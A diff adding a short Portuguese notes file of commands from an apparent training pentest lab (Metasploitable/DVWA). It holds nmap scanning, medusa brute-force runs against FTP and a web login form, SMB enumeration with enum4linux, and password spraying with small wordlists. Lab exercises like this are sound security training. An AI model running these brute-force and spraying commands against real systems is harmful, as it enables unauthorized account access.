@@ -1,0 +1,19 @@
+Comandos utilizados no pentest de força bruta em FTP:
+ping -c 4 ip_alvo
+nmap -sV -p 21,22,80,445,139 ip_alvo
+ftp ip_alvo
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+medusa -h ip_alvo -U users.txt -P pass.txt -M ftp -t 6
+
+Comandos utilizados no pentest de força bruta em formulários de login web:
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+medusa -h ip_alvo -U users.txt -P pass.txt -M http \ -m PAGE:'/dvwa/login.php' \ -m FORM:'username=^USER^&password=^PASS^&Login=Login' \ -m 'FAIL=Login failed' -t 6
+
+Comandos utilizads no pentest com enumeração e pessword spraying em SMB:
+enum4linux -a ip_alvo | tee enum4output.txt
+echo -e "user\nmsfadmin\nservice" > smb_users.txt
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+medusa -h ip_alvo -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+smbclient -L //ip_alvo -U usuario_sucesso
